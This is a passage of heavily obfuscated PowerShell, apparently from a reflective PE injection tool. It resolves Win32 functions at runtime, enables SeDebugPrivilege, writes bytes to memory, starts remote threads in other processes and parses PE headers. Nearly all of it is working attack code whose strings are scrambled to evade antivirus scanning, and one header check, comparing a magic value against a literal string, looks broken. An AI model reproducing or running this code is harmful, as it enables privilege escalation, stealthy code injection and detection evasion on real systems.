        ${wi`N3`2`F`UnCTiOns} | &("{1}{2}{0}"-f'er','Add-Mem','b') -MemberType ("{0}{1}{2}" -f 'NotePro','per','ty') -Name ("{2}{0}{1}"-f 'reate','Thread','C') -Value ${CrE`A`TeT`hR`Ead}
        
        return ${WIN`32f`UNc`T`IOnS}
    }
    

            
    
    
    

    
    
    Function SU`B-`SIG`NeDInta`s`U`NSigneD
    {
        Param(
        [Parameter(POsITioN = 0, MaNdaTORy = ${TR`UE})]
        [Int64]
        ${VAl`Ue1},
        
        [Parameter(pOsItION = 1, mAndatORy = ${t`RUe})]
        [Int64]
        ${Valu`E2}
        )
        
        [Byte[]]${VaLUE1`ByT`eS} =   ( VaRiaBLE ('0ynvg'+'a') ).vALuE::("{1}{0}" -f'es','GetByt').Invoke(${VAL`U`E1})
        [Byte[]]${vA`l`UE2bytEs} =  (DiR  ('vAR'+'ia'+'Bl'+'E:0yNVga')).vALue::("{0}{2}{1}"-f'Get','ytes','B').Invoke(${VA`Lue2})
        [Byte[]]${fI`Na`L`BYTES} =  ( LS  vArIabLe:0YNVGA ).vAluE::"G`eTByt`eS"([UInt64]0)

        if (${vaLU`E1`BYTES}."cO`UNt" -eq ${vAlUe`2`BYTES}."coU`Nt")
        {
            ${Ca`RRY`oveR} = 0
            for (${i} = 0; ${i} -lt ${V`ALU`e`1BYtES}."CoU`NT"; ${I}++)
            {
                ${V`Al} = ${Va`l`Ue1`ByTES}[${i}] - ${C`ARRYOv`Er}
                
                if (${v`AL} -lt ${vaLUE`2b`y`TeS}[${I}])
                {
                    ${v`AL} += 256
                    ${CA`R`RyOvEr} = 1
                }
                else
                {
                    ${C`ARRyov`eR} = 0
                }
                
                
                [UInt16]${S`Um} = ${V`AL} - ${V`AL`UE2`BYTES}[${I}]

                ${F`iNalByt`es}[${i}] = ${s`Um} -band 0x00FF
            }
        }
        else
        {
            Throw ("{0}{12}{11}{2}{4}{8}{6}{5}{9}{1}{10}{7}{3}"-f'Cannot ','di','tr','sizes','act byt','r','ar','t ','e','ays of ','fferen','b','su')
        }
        
        return   $0YnvGA::("{1}{0}"-f 'nt64','ToI').Invoke(${FIn`AL`ByTeS}, 0)
    }
    

    Function A`d`d`-SI`gNED`I`NTaSUNSIGN`eD
    {
        Param(
        [Parameter(POSITION = 0, MaNdATORy = ${t`RUe})]
        [Int64]
        ${Va`lu`e1},
        
        [Parameter(poSITioN = 1, MAnDaTOrY = ${T`RUe})]
        [Int64]
        ${V`ALU`E2}
        )
        
        [Byte[]]${vaL`U`E1b`ytES} =  (  vARIAble  ('0Y'+'N'+'Vga') -VALUe  )::("{0}{1}{2}"-f 'Ge','tB','ytes').Invoke(${v`A`lue1})
        [Byte[]]${V`A`lU`E2byTes} =   (  Item ("Va"+"riabL"+"e"+":0yn"+"Vga")  ).valUe::("{2}{0}{1}"-f 'e','tBytes','G').Invoke(${VA`lue2})
        [Byte[]]${Fin`A`LBYtES} =   ( Gi ("V"+"arI"+"ABLe:"+"0ynv"+"ga")).vALue::"Getb`y`TeS"([UInt64]0)

        if (${VAlu`E1ByT`ES}."c`Ount" -eq ${vA`LUE2b`ytES}."COu`NT")
        {
            ${ca`R`R`yoVer} = 0
            for (${i} = 0; ${i} -lt ${vaLue1`BY`TEs}."co`UNT"; ${I}++)
            {
                
                [UInt16]${s`Um} = ${vAlUe`1by`TeS}[${i}] + ${VA`LuE`2`BYTES}[${i}] + ${CaR`RyOv`eR}

                ${FINAL`By`T`eS}[${i}] = ${S`UM} -band 0x00FF
                
                if ((${s`UM} -band 0xFF00) -eq 0x100)
                {
                    ${CaRRy`O`VeR} = 1
                }
                else
                {
                    ${c`Ar`RYOVEr} = 0
                }
            }
        }
        else
        {
            Throw ("{10}{8}{12}{5}{3}{0}{11}{6}{4}{7}{9}{1}{2}" -f'yt',' si','zes','d b','of di','t ad','arrays ','ffer','an','ent','C','e','no')
        }
        
        return  $0YnVga::("{1}{0}"-f 'oInt64','T').Invoke(${FiNa`LB`YTEs}, 0)
    }
    

    Function c`OMPaRe-vAl1grE`A`TER`ThA`NvAl2ASUint
    {
        Param(
        [Parameter(poSitION = 0, MAndAToRy = ${t`Rue})]
        [Int64]
        ${v`ALuE1},
        
        [Parameter(poSiTiON = 1, MANdaTorY = ${T`Rue})]
        [Int64]
        ${V`A`Lue2}
        )
        
        [Byte[]]${va`LU`E1B`ytEs} =  $0yNvGA::("{0}{1}{2}" -f 'GetB','yte','s').Invoke(${valu`E1})
        [Byte[]]${v`ALUe2`B`yTES} =  ( DIr vaRIAble:0ynVGa).VALUE::("{1}{0}" -f'etBytes','G').Invoke(${v`ALU`E2})

        if (${Va`L`U`e1ByTES}."cou`NT" -eq ${V`AlUE`2ByteS}."Co`UNT")
        {
            for (${i} = ${vAl`U`E1B`ytES}."c`ouNt"-1; ${I} -ge 0; ${I}--)
            {
                if (${VAlue`1b`Y`TeS}[${I}] -gt ${VALu`E2bY`TeS}[${I}])
                {
                    return ${T`RuE}
                }
                elseif (${vALUe`1ByT`ES}[${I}] -lt ${vALU`e2By`T`Es}[${I}])
                {
                    return ${fa`LsE}
                }
            }
        }
        else
        {
            Throw ("{8}{9}{12}{3}{10}{6}{2}{5}{11}{0}{7}{1}{4}"-f ' dif','n','arr',' ','t size','ay','yte ','fere','C','anno','compare b','s of','t')
        }
        
        return ${F`AlSe}
    }
    

    Function Con`V`E`R`T-uINttOiNT
    {
        Param(
        [Parameter(pOSitIon = 0, manDaToRy = ${t`RUe})]
        [UInt64]
        ${vA`L`UE}
        )
        
        [Byte[]]${Val`U`EBy`Tes} =   ( VARIabLE 0yNVGa  ).VaLue::("{2}{0}{1}"-f'B','ytes','Get').Invoke(${val`UE})
        return ( ( GI ('Var'+'iA'+'BlE'+':0YNV'+'gA')).vAlUE::("{1}{2}{0}" -f't64','ToI','n').Invoke(${VAL`UEB`yTES}, 0))
    }


    Function get-`HEx
    {
        Param(
        [Parameter(positION = 0, MaNDatORy = ${t`RUe})]
        ${VaL`UE} 
        )

        ${VALue`SI`zE} =   (gET-vARiaBlE  znDo  -ValUeoN )::"sIzE`of"([Type]${va`l`Ue}.("{1}{0}" -f 'ype','GetT').Invoke()) * 2
        ${H`Ex} = "0x{0:X$($ValueSize)}" -f [Int64]${v`Al`UE} 

        return ${H`EX}
    }
    
    
    Function T`e`sT-`meMOr`YrangE`VaLiD
    {
        Param(
        [Parameter(PoSitiON = 0, MaNDATOry = ${tr`Ue})]
        [String]
        ${d`eBug`s`TrING},
        
        [Parameter(POsiTiOn = 1, MANdaTORy = ${tR`UE})]
        [System.Object]
        ${pEiN`Fo},
        
        [Parameter(PosiTIOn = 2, MaNdatORy = ${t`RUE})]
        [IntPtr]
        ${S`TaRTAd`DRe`ss},
        
        [Parameter(pARAMeTeRSeTnAme = "eN`dad`DreSS", posITion = 3, MANdatORY = ${Tr`Ue})]
        [IntPtr]
        ${EndA`DdRe`ss},
        
        [Parameter(PArAmetErsEtNAME = "sI`Ze", pOsiTiOn = 3, MANDatORY = ${T`RUe})]
        [IntPtr]
        ${sI`zE}
        )
        
        [IntPtr]${f`INAL`e`N`DaDdreSs} =   $pEFZ6j::"Z`ERo"
        if (${PS`CMD`lEt}.PArAMEtErsETNaME -eq ("{1}{0}"-f 'ze','Si'))
        {
            [IntPtr]${F`I`NalEnD`AdD`REss} = [IntPtr](&("{0}{6}{5}{2}{1}{3}{4}" -f 'Add-Sign','s','Un','ig','ned','As','edInt') (${sTA`RtAd`DrESs}) (${sI`ZE}))
        }
        else
        {
            ${fin`AL`EnD`AdDresS} = ${eN`dA`DD`ReSs}
        }
        
        ${pE`ENDa`dDr`eSs} = ${P`e`infO}."en`dadD`ResS"
        
        if ((&("{2}{9}{6}{4}{10}{0}{3}{8}{1}{7}{5}" -f 'ate','hanVal','C','r','re-Val1','AsUInt','pa','2','T','om','Gre') (${PEi`N`Fo}."pEHan`dle") (${sTaRTAD`d`R`eSS})) -eq ${TR`Ue})
        {
            Throw ('Trying'+' '+'to'+' '+'wri'+'te '+'to'+' '+'m'+'emory'+' '+'s'+'mal'+'ler '+'than'+' '+'a'+'lloc'+'ated '+'addr'+'e'+'ss '+'rang'+'e.'+' '+"$DebugString")
        }
        if ((&("{2}{5}{3}{0}{6}{8}{4}{1}{7}{9}"-f 'l1Grea','al2','Compa','e-Va','hanV','r','ter','A','T','sUInt') (${F`inAlen`Da`DDReSs}) (${P`eEn`dADd`ResS})) -eq ${t`RuE})
        {
            Throw ('Try'+'in'+'g '+'t'+'o '+'wri'+'te '+'to'+' '+'m'+'emor'+'y '+'great'+'er'+' '+'th'+'an '+'allo'+'cat'+'e'+'d '+'addre'+'ss '+'ra'+'nge.'+' '+"$DebugString")
        }
    }
    
    
    Function w`R`iTE-BYtE`S`T`OMEm`ORY
    {
        Param(
            [Parameter(positIoN=0, mAndaTory = ${TR`UE})]
            [Byte[]]
            ${bYT`es},
            
            [Parameter(pOSITiON=1, maNDatOry = ${t`Rue})]
            [IntPtr]
            ${M`emOr`yaDdRESs}
        )
    
        for (${O`FFs`et} = 0; ${OFF`s`et} -lt ${b`Yt`Es}."L`En`gTH"; ${O`FfSeT}++)
        {
             (VARIABLe  ('Z'+'ndo')).vALUE::"W`RI`TebyTe"(${MEm`OryaDdrE`ss}, ${o`F`FSET}, ${b`YtES}[${o`FFSet}])
        }
    }
    

    
    Function Ge`T-`D`ElEgAT`Et`yPe
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( poSitiOn = 0)]
            [Type[]]
            ${para`mET`ERs} = (&("{1}{2}{0}"-f'ject','Ne','w-Ob') ("{0}{1}" -f'Ty','pe[]')(0)),
            
            [Parameter( PosiTioN = 1 )]
            [Type]
            ${R`ETuR`Nt`yPE} = [Void]
        )

        ${domA`In} =  (  GCI ('varIA'+'b'+'Le'+':XO9rig')  ).Value::"CU`RrEntdoM`AiN"
        ${d`YNAS`SEMbLy} = &("{2}{0}{1}" -f 'Obje','ct','New-') ("{1}{4}{5}{7}{3}{8}{6}{2}{0}" -f'Name','Sy','embly','ection','stem','.Re','Ass','fl','.')(("{4}{1}{2}{3}{0}" -f 'ate','fl','ec','tedDeleg','Re'))
        ${A`sSEmblYb`UI`LDEr} = ${D`OMAIN}."deFined`Y`Na`mic`A`ss`emBLy"(${dyNA`sSE`mB`LY},   $PIC0mA::"r`UN")
        ${M`OD`U`L`EBuIlder} = ${AsS`eMbL`YbU`IL`dER}.("{4}{2}{3}{0}{1}{5}" -f'nam','i','ine','Dy','Def','cModule').Invoke(("{1}{2}{3}{0}"-f'ule','InMemo','ry','Mod'), ${faL`Se})
        ${t`yPE`Bu`IldER} = ${M`ODu`L`EBu`IlDeR}.("{2}{0}{1}" -f 'i','neType','Def').Invoke(("{2}{3}{0}{1}"-f 'Typ','e','MyDeleg','ate'), ("{1}{9}{0}{6}{4}{7}{2}{5}{8}{3}"-f'ic, Seal','Class','ss, ','ss','Cl','AutoCl','ed, Ansi','a','a',', Publ'), [System.MulticastDelegate])
        ${c`O`NST`R`Uc`TorBuilDer} = ${tY`p`EBUildER}.("{1}{0}{3}{2}" -f 'fin','De','tor','eConstruc').Invoke(("{6}{7}{0}{1}{2}{3}{9}{5}{4}{8}"-f 'ec','ial','N','a','g, Pu',', HideBySi','RT','Sp','blic','me'),   $BN0::"stan`DArD", ${par`A`M`eterS})
        ${coNs`TrU`c`ToRBuIlDEr}.("{4}{3}{5}{0}{1}{2}" -f'l','ementationFlag','s','t','Se','Imp').Invoke(("{2}{3}{1}{0}{4}"-f'ag',', Man','Runtim','e','ed'))
        ${m`e`TH`odbUI`ldeR} = ${ty`p`eBu`IldEr}.("{1}{2}{0}" -f'hod','DefineM','et').Invoke('Invoke', ("{2}{6}{0}{5}{9}{4}{1}{8}{3}{7}"-f'lic,','ewSlot,','P','irtu',' N',' HideBy','ub','al',' V','Sig,'), ${r`eTUrnt`ypE}, ${pA`RAMe`T`ERs})
        ${mE`ThOdBuIl`D`er}.("{4}{5}{2}{0}{3}{1}" -f 'ati','Flags','ent','on','Se','tImplem').Invoke(("{3}{2}{0}{1}{4}"-f ' M','an','ime,','Runt','aged'))
        
        &("{3}{0}{2}{1}"-f 'Ou','t','tpu','Write-') ${t`YPEBuI`L`DEr}.("{1}{2}{0}" -f 'teType','C','rea').Invoke()
    }


    
    Function G`eT-p`ROca`ddResS
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( PosItiOn = 0, MAnDatorY = ${Tr`Ue} )]
            [String]
            ${MOD`Ule},
            
            [Parameter( poSITIOn = 1, MANDAtory = ${tr`Ue} )]
            [String]
            ${P`R`ocedurE}
        )

        
        ${Sy`Ste`MASS`Em`BLy} =  (GeT-VarIaBLe XO9RIg -VALueO  )::"CU`RReNTdo`mA`in".("{2}{4}{0}{1}{3}"-f'm','b','GetA','lies','sse').Invoke() |
            &("{3}{0}{1}{2}"-f 'Ob','jec','t','Where-') { ${_}."glOBA`laSsemb`lyCAc`He" -And ${_}."L`ocaTI`on".("{0}{1}"-f 'S','plit').Invoke('\\')[-1].("{0}{2}{1}" -f 'Equ','ls','a').Invoke(("{2}{1}{0}" -f 'dll','m.','Syste')) }
        ${U`Ns`AF`E`N`ATIveMeTHODS} = ${sy`s`TEMass`eMBLY}.("{1}{2}{0}"-f'pe','G','etTy').Invoke(("{0}{1}{3}{4}{6}{2}{5}"-f 'Mi','cro','ns','soft.Win','32.','afeNativeMethods','U'))
        
        ${Ge`TM`odUlE`haN`DlE} = ${uNSA`F`EnAT`IVemEth`OdS}.("{1}{2}{0}" -f'Method','Ge','t').Invoke(("{1}{4}{2}{0}{3}" -f'and','Ge','oduleH','le','tM'))
        ${gEtPr`O`caDdR`Ess} = ${uNSA`F`eN`ATIVEmE`Tho`dS}.("{0}{2}{1}" -f'G','ethod','etM').Invoke(("{1}{3}{2}{0}"-f'ess','GetPro','r','cAdd'))
        
        ${keRn32`han`d`lE} = ${GeTmO`d`U`leHAndle}."iN`VoKe"(${n`ULL}, @(${m`oDuLe}))
        ${T`MPpTR} = &("{0}{2}{1}"-f'New-Obj','ct','e') ("{1}{0}{2}" -f'nt','I','Ptr')
        ${ha`NDL`erEF} = &("{2}{0}{1}" -f 'w','-Object','Ne') ("{1}{4}{5}{0}{7}{6}{3}{2}" -f 'ntime.Inte','Syste','.HandleRef','ices','m.','Ru','v','ropSer')(${TMpp`TR}, ${KeRn3`2`ha`NDlE})

        
        &("{2}{3}{1}{0}"-f'utput','e-O','W','rit') ${g`ET`pR`OCAddRe`sS}."I`Nvoke"(${Nu`Ll}, @([System.Runtime.InteropServices.HandleRef]${H`ANDLeR`eF}, ${P`ROceDU`RE}))
    }
    
    
    Function ENAb`L`e-`SEDeb`UgpR`i`VIlEGe
    {
        Param(
        [Parameter(poSiTiON = 1, MaNdAtOrY = ${t`Rue})]
        [System.Object]
        ${wI`N`32f`UNCt`IOnS},
        
        [Parameter(pOSItIoN = 2, mANDatORY = ${T`Rue})]
        [System.Object]
        ${W`iN3`2`TyPES},
        
        [Parameter(pOSItiON = 3, MaNdatOry = ${tr`Ue})]
        [System.Object]
        ${wIn`32consT`A`NTS}
        )
        
        [IntPtr]${tH`Re`Ad`hANDLe} = ${wIn32f`UN`ctI`OnS}."GE`Tc`Urr`EN`TthRE`AD"."i`NVOKe"()
        if (${tHrE`Adh`AnDlE} -eq  $pefz6J::"ze`Ro")
        {
            Throw ("{0}{7}{5}{4}{2}{3}{1}{6}" -f'Unab','rren',' to t','he cu','ndle','the ha','t thread','le to get ')
        }
        
        [IntPtr]${T`HRead`TOk`eN} =   (  vArIaBLe  pEFz6J ).VAlue::"z`eRo"
        [Bool]${R`eSULt} = ${win`32fuNc`TIO`Ns}."o`Pe`Nt`hr`EaDtokEn"."Inv`O`KE"(${t`HrEa`DHA`NDLe}, ${Wi`N32`co`NSt`ANts}."toKE`N_`queRY" -bor ${W`in`32con`staNTS}."tokeN_a`DjUSt_pr`Iv`il`E`G`ES", ${f`AlsE}, [Ref]${tHr`eAd`TOkeN})
        if (${r`eS`ULt} -eq ${fA`LSe})
        {
            ${E`Rro`RC`ode} =   ( VaRiABlE ZndO).VALUe::("{3}{0}{2}{1}{4}"-f 'a','in32','stW','GetL','Error').Invoke()
            if (${eRr`orCO`de} -eq ${WIN32co`Ns`TaN`Ts}."E`R`RoR_N`O_t`OKeN")
            {
                ${r`eS`UlT} = ${wIn3`2F`Un`C`TIONS}."imPEr`SonA`T`Ese`lF"."iNvo`Ke"(3)
                if (${RES`U`LT} -eq ${f`A`Lse})
                {
                    Throw ("{5}{6}{0}{4}{1}{2}{3}"-f 'a','nate ','s','elf','ble to imperso','U','n')
                }
                
                ${ReS`ULT} = ${WiN32`F`UNc`TIOns}."Op`EN`ThreaD`TOken"."invO`kE"(${tHReA`d`hAn`dLe}, ${w`in32co`NSTants}."T`oKEN_Q`Ue`RY" -bor ${wi`N`32cO`NsTANTS}."tOK`eN`_Ad`JUS`T_p`RIvIlegEs", ${f`A`LSE}, [Ref]${tHrEaD`Tok`En})
                if (${rEsU`lT} -eq ${fa`lse})
                {
                    Throw ("{0}{1}{2}{4}{3}" -f 'U','nab','le ','ken.','to OpenThreadTo')
                }
            }
            else
            {
                Throw ('U'+'nable'+' '+'to'+' '+'Op'+'enTh'+'r'+'eadTok'+'en. '+'Err'+'or '+'c'+'ode: '+"$ErrorCode")
            }
        }
        
        [IntPtr]${p`LUiD} =  $ZNdO::"allochgL`o`B`Al"(  (chILDiTEm ("vAri"+"ABle"+":Z"+"ndO") ).VaLuE::"SIZe`of"([Type]${wi`N`32tY`Pes}."L`UId"))
        ${r`e`SULT} = ${W`IN`32`FunCT`IOnS}."lOo`kUPP`RIv`IlEGevaLue"."InvO`Ke"(${N`ULL}, ("{1}{3}{2}{0}"-f'ge','SeDeb','ivile','ugPr'), ${Plu`ID})
        if (${rES`ULt} -eq ${f`AlSE})
        {
            Throw ("{3}{4}{5}{2}{8}{7}{1}{6}{0}"-f 'e','eg','u','Unable to call ','L','ook','eValu','Privil','p')
        }

        [UInt32]${TokEnPr`iv`S`IZE} =   $zndo::"sI`ZeOf"([Type]${wiN32`T`yPES}."tOk`En_PR`IV`ilEges")
        [IntPtr]${toKENp`Ri`VILe`G`EsMEM} =   (  ChILDitEm ("varIAble"+":zND"+"O")).valuE::("{0}{1}{2}" -f'AllocHGl','o','bal').Invoke(${tokE`NP`Ri`VsizE})
        ${TO`kEnPR`I`VilEges} =  $zndo::"Pt`RtOS`TruC`TU`Re"(${ToKE`NP`RiV`iLe`G`esmEM}, [Type]${win3`2`TYpeS}."to`k`E`N_PrivilEGES")
        ${to`keNPRi`VI`l`EgES}."p`Riv`ileG`e`COuNt" = 1
        ${to`KENPRIV`iL`egES}."P`RIVil`EG`Es"."L`UiD" =  (Gi ("VAr"+"iA"+"bLe:"+"znDo")).VaLuE::"P`TrtoStRu`ctU`Re"(${PLU`Id}, [Type]${w`in`32typ`ES}."L`UID")
        ${tOK`EnPRI`VILeGes}."privi`le`geS"."At`TrIbU`TEs" = ${win32`c`O`NstAnTs}."se_pR`Iv`i`lEge_enA`BLeD"
          (  diR  ("Va"+"RIab"+"le:Z"+"nDo")).vALue::("{0}{1}{2}{3}{4}" -f 'Stru','ct','u','reToP','tr').Invoke(${to`Ke`NpriV`ile`Ges}, ${to`KeNPriv`iLeG`E`sm`eM}, ${TR`Ue})

        ${R`eSulT} = ${w`iN32`FUnC`TiONs}."ad`j`USTto`KENPrIv`i`leGEs"."I`NvokE"(${T`hr`eAd`TokEN}, ${fa`l`sE}, ${tOK`EnpR`I`VilEgE`s`meM}, ${tOKeNP`R`ivSiZE},   $PeFZ6j::"z`eRO",   (  Get-VARIable  ('pEF'+'z6j') ).ValUe::"zE`RO")
        ${Err`O`RCODE} =   (vAriAbLE ZNdo -vaLue )::("{2}{1}{3}{0}"-f '2Error','Wi','GetLast','n3').Invoke() 
        if ((${r`esu`lT} -eq ${FA`Lse}) -or (${Er`RO`RCo`De} -ne 0))
        {
            
        }
        
          $ZNDo::("{1}{2}{3}{0}"-f'obal','FreeH','G','l').Invoke(${tokeNPRi`Vi`l`EgE`sM`EM})
    }
    
    
    Function CRe`Ate-Rem`otEThR`ead
    {
        Param(
        [Parameter(pOSITiON = 1, mAnDatOrY = ${tR`Ue})]
        [IntPtr]
        ${PRO`CE`SsH`ANdlE},
        
        [Parameter(POSITION = 2, mAndATOry = ${TR`Ue})]
        [IntPtr]
        ${sT`Ar`TAddr`eSS},
        
        [Parameter(posiTiON = 3, mANDATory = ${F`Al`SE})]
        [IntPtr]
        ${a`RgUM`eNT`PTR} =  (GcI ("vARI"+"ab"+"L"+"E:PEF"+"z6j")  ).ValUe::"ZE`Ro",
        
        [Parameter(pOSitiOn = 4, maNdaTORy = ${tr`UE})]
        [System.Object]
        ${wiN`32`FUnCt`ionS}
        )
        
        [IntPtr]${rEmoT`eTHrE`AD`HanDLE} =   ( cHiLDiTem vaRiABLe:pefZ6j).vAlUE::"ze`Ro"
        
        ${OSVE`RSi`On} =   ( gCI VaRIaBle:Nqz).VAlue::"OS`Ve`RSiON"."VE`RsioN"
        
        if ((${o`svE`RSiOn} -ge (&("{0}{1}{2}"-f 'Ne','w-Ob','ject') ("{1}{2}{0}" -f'n','Ver','sio') 6,0)) -and (${o`S`VERSION} -lt (&("{0}{2}{1}" -f'Ne','bject','w-O') ("{0}{1}"-f'V','ersion') 6,2)))
        {
            
            ${rE`T`VAL}= ${WiN3`2`Fun`Ct`ioNS}."n`TC`Re`A`TEthrEa`DEx"."Invo`Ke"([Ref]${REMOte`T`HReaDH`AN`dLE}, 0x1FFFFF,  $pEfZ6j::"Z`ErO", ${Proces`SH`AN`dlE}, ${s`TARTA`dD`ReSs}, ${A`Rgu`m`entptR}, ${FA`l`Se}, 0, 0xffff, 0xffff,   (  Get-vaRIAbLE ('pEF'+'Z'+'6J')  -ValuE  )::"ZE`Ro")
            ${l`As`TERROR} =   $ZNdo::("{4}{2}{5}{3}{0}{1}"-f'Win32Er','ror','L','st','Get','a').Invoke()
            if (${REmot`eT`H`Re`Ad`hANDLe} -eq  (GCI ('VaRi'+'aB'+'Le'+':P'+'efz6J')).VAluE::"z`Ero")
            {
                Throw ('Err'+'or '+'i'+'n '+'NtCreat'+'eThreadE'+'x'+'. '+'Retur'+'n '+'valu'+'e: '+"$RetVal. "+'LastEr'+'ror:'+' '+"$LastError")
            }
        }
        
        else
        {
            
            ${ReMo`TE`T`hreA`DHandlE} = ${wi`N`3`2FuNcTIO`Ns}."C`REaT`EreMote`ThREaD"."Invo`Ke"(${p`R`Oc`eSs`haNDLE},  $PeFZ6j::"ZE`RO", [UIntPtr][UInt64]0xFFFF, ${sTArtadDR`E`sS}, ${A`R`GUMeNtPtR}, 0,  (GET-VARiABlE  peFz6j ).vaLue::"ZE`Ro")
        }
        
        if (${Re`MO`TETh`ReAdhaNdlE} -eq  (  vAriABLe peFz6J ).VALue::"Ze`RO")
        {
            &("{1}{3}{2}{0}" -f 'r','Write-Er','o','r') ("{10}{9}{8}{12}{1}{0}{2}{4}{6}{11}{5}{3}{7}"-f'ead,','ng remote thr',' t',' is nu','hre','ndle','ad ','ll','ror cr','r','E','ha','eati') -ErrorAction ("{0}{1}" -f'Sto','p')
        }
        
        return ${RemoTET`H`R`e`AdHanDLE}
    }

    

    Function get-IMa`gEn`Th`ead`eRS
    {
        Param(
        [Parameter(pOSiTiON = 0, MaNdATOrY = ${tR`Ue})]
        [IntPtr]
        ${P`E`HAnDLe},
        
        [Parameter(pOsItIon = 1, mANdatOrY = ${T`RUe})]
        [System.Object]
        ${w`IN`3`2tYPeS}
        )
        
        ${nThEa`D`erSIn`FO} = &("{1}{0}{2}"-f'ew-Obje','N','ct') ("{0}{1}{2}{3}"-f'Sys','tem.Obj','ec','t')
        
        
        ${doSH`E`ADer} =  ( gET-vAriabLE zndO  ).Value::"p`TRTOSTruC`T`Ure"(${Pe`haND`LE}, [Type]${WI`N`32typEs}."ImAGE`_`doS_hE`ADER")

        
        [IntPtr]${nTh`EadER`SPtr} = [IntPtr](&("{1}{0}{2}{5}{4}{3}" -f'-Signe','Add','dIn','nsigned','AsU','t') ([Int64]${P`EHA`NdLE}) ([Int64][UInt64]${d`O`SHEad`er}."e_l`FaNEw"))
        ${nT`HE`A`dERsINFo} | &("{2}{1}{0}"-f 'er','dd-Memb','A') -MemberType ("{2}{0}{1}"-f'teP','roperty','No') -Name ("{3}{1}{2}{0}"-f 'rsPtr','t','Heade','N') -Value ${Nthe`A`D`erS`PtR}
        ${I`MAg`eN`Theade`RS64} =   (  vARIaBLe  zNdo  ).VALUe::"pTrtO`sTRu`CtUre"(${Nth`Ead`eR`SP`TR}, [Type]${win3`2t`ypes}."ImaG`E_Nt`_heaDer`S64")
        
        
        if (${I`mAGENtHE`A`D`E`RS64}."sI`g`N`AtURE" -ne 0x00004550)
        {
            throw ("{1}{2}{4}{3}{5}{0}" -f'signature.','Invalid',' IMAGE_','_HEA','NT','DER ')
        }
        
        if (${IMAG`eNt`He`AD`eRs`64}."oP`T`ionAlheAD`er"."mAG`IC" -eq ("{0}{1}{2}{3}{4}"-f'IMA','G','E_N','T_','OPTIONAL_HDR64_MAGIC'))
        {
            ${NtHeaDERS`IN`Fo} | &("{2}{0}{1}" -f 'mbe','r','Add-Me') -MemberType ("{2}{3}{1}{0}" -f'y','rt','Not','ePrope') -Name ("{5}{1}{3}{0}{4}{2}"-f'_H','E_','ADERS','NT','E','IMAG') -Value ${IMAG`ENTHea`DErS`64}
            ${nt`Hea`De`RSI`NfO} | &("{1}{0}{2}" -f'm','Add-Me','ber') -MemberType ("{2}{0}{3}{1}" -f'p','y','NotePro','ert') -Name ("{2}{1}{0}" -f'it','4B','PE6') -Value ${T`RUe}
        }
        else
        {
            ${IMAG`EnT`He`ADE`RS32} =   (  gCI ("va"+"rIABl"+"E:zND"+"o")  ).VAlUE::"ptrt`oS`T`Ruc`TuRE"(${nTHe`A`Dersp`Tr}, [Type]${W`In32t`y`pES}."I`M`AGE_Nt_`he`Ad`ers32")
            ${nT`HeaDE`R`s`InfO} | &("{2}{0}{1}"-f'-M','ember','Add') -MemberType ("{1}{2}{0}" -f'perty','NoteP','ro') -Name ("{1}{0}{2}{3}"-f'AD','IMAGE_NT_HE','E','RS') -Value ${I`MaGenT`heAdErS`32}
            ${NtHE`AdErS`infO} | &("{2}{0}{1}"-f'Me','mber','Add-') -MemberType ("{0}{2}{1}" -f 'Note','y','Propert') -Name ("{0}{2}{1}" -f 'PE','it','64B') -Value ${F`A`LSe}
        }
        
        return ${nTHE`A`deRSInfo}
    }


    
    Function Ge`T`-pEBaSiCin`Fo
    {
        Param(
        [Parameter( posiTIon = 0, maNdATOry = ${T`RuE} )]
        [Byte[]]
        ${p`E`BYtes},
        
        [Parameter(pOsITION = 1, maNdaTORY = ${TR`Ue})]
        [System.Object]
        ${WIn32`TY`P`ES}
        )
        
        ${P`e`INfO} = &("{3}{1}{0}{2}"-f'-Ob','w','ject','Ne') ("{2}{0}{3}{1}"-f'em.O','ct','Syst','bje')
        
        
        [IntPtr]${UNm`An`A`GedPe`By`Tes} =   (gi VARIAbLe:ZndO ).VAlue::("{2}{3}{0}{1}"-f'locHG','lobal','A','l').Invoke(${P`Eb`yTeS}."LeN`GTH")
          (iTEM  ('V'+'AriabLe'+':ZN'+'D'+'o')  ).ValUe::("{1}{0}"-f 'opy','C').Invoke(${PEb`yT`es}, 0, ${U`N`MaN`AG`edp`EbyTES}, ${PE`Byt`eS}."Le`NgtH") | &("{1}{0}{2}"-f'u','O','t-Null')
        
        
        ${n`THea`dE`R`SiNfO} = &("{0}{2}{1}{3}" -f'Get-ImageNt','eade','H','rs') -PEHandle ${UNMAN`AGed`P`eb`Ytes} -Win32Types ${wIn`32t`yPeS}
        
        
        ${P`EiN`Fo} | &("{2}{1}{0}"-f'r','be','Add-Mem') -MemberType ("{1}{2}{0}{3}"-f'r','NoteProp','e','ty') -Name ("{1}{0}"-f 'Bit','PE64') -Value (${NT`H`eAde`RsiNFO}."pE64`Bit")
        ${pe`In`Fo} | &("{0}{2}{1}{3}" -f'Add','embe','-M','r') -MemberType ("{2}{3}{0}{1}"-f'r','operty','No','teP') -Name ("{2}{0}{4}{1}{3}" -f 'I','B','Original','ase','mage') -Value (${N`TH`EAdErSIN`Fo}."Im`AgE`_`N`T_headERs"."O`PTi`o`NalHeADer"."i`mA`geBAsE")
        ${P`einFo} | &("{2}{1}{0}"-f 'er','b','Add-Mem') -MemberType ("{3}{0}{2}{1}" -f'ot','y','ePropert','N') -Name ("{0}{1}{2}" -f 'Si','zeOfImag','e') -Value (${NT`heAdeR`sIN`FO}."IMag`e`_N`T_HeaD`eRS"."opTI`ONal`HE`ADer"."s`IZe`oFIMagE")
        ${P`Ei`NfO} | &("{3}{2}{0}{1}" -f'embe','r','M','Add-') -MemberType ("{2}{1}{0}"-f'ty','Proper','Note') -Name ("{3}{2}{1}{4}{0}"-f'rs','a','e','SizeOfH','de') -Value (${nt`hE`A`Der`SINfO}."iMA`gE`_Nt_h`E`AdERs"."O`P`Ti`ONAlhE`AdER"."SIz`EOF`hEADErS")
        ${pe`IN`Fo} | &("{0}{3}{1}{2}" -f'Add-','em','ber','M') -MemberType ("{2}{1}{0}"-f 'y','otePropert','N') -Name ("{3}{5}{1}{2}{4}{0}" -f 'tics','Ch','aract','D','eris','ll') -Value (${n`T`heADeRSiN`Fo}."iMAGe_nt`_`HeA`d`E`Rs"."OptI`oNA`lH`eadeR"."dLLCH`ARAcT`eRiSt`iCS")
        
        
          (varIAbLe ('zNd'+'o')).value::("{0}{2}{1}" -f'Fre','Global','eH').Invoke(${uNM`ANAG`E`DpE`ByTES})
